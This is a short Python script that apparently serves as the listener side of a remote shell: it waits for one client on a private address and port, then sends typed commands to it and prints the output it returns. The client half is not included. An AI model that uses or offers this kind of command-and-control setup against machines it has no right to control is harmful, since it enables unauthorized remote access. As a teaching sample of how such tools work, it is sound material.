#  written by medusa


import socket

HOST = '192.168.178.69'
PORT = 12345
server = socket.socket()
server.bind((HOST, PORT))
print('[+] Server Started')
print('[+] Listening For Client Connection ...')
server.listen(1)
client, client_addr = server.accept()
print(f'[+] {client_addr} Client connected to the server')

while True:
    command = input('Enter Command : ')
    command = command.encode()
    client.send(command)
    print('[+] Command sent')
    try:
        output = client.recv(1024)
        output = output.decode()
        print(f"Output: {output}")
    except:
        exit("error")
